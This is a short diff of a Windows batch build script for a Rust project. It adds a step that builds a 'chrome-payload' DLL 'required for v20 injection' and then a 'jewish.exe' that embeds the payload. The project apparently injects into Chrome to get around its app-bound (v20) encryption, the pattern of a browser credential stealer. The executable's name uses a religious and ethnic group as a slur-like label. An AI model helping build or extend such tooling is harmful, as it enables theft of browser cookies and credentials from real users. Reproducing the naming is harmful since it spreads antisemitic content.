@@ -111,10 +111,18 @@ exit /b 0
 :do_build
 cd /d "%~dp0"
 
-echo [*] Building workspace (payload + jewish.exe)...
-echo     First build: several minutes. Next builds: only changed files.
+echo [*] Building payload DLL (required for v20 injection)...
+cargo build --release -p chrome-payload || goto build_fail
+if not exist "target\release\chrome_payload.dll" (
+    echo [X] target\release\chrome_payload.dll missing after payload build
+    pause
+    exit /b 1
+)
+for %%F in ("target\release\chrome_payload.dll") do echo     payload: %%~zF bytes
+
+echo [*] Building jewish.exe (embedding payload)...
 echo     Final link step may sit at 237/238 for ~30-90s — normal.
-cargo build --release || goto build_fail
+cargo build --release -p jewish || goto build_fail
 
 if not exist release mkdir release
 copy /Y "target\release\jewish.exe" "release\" >nul
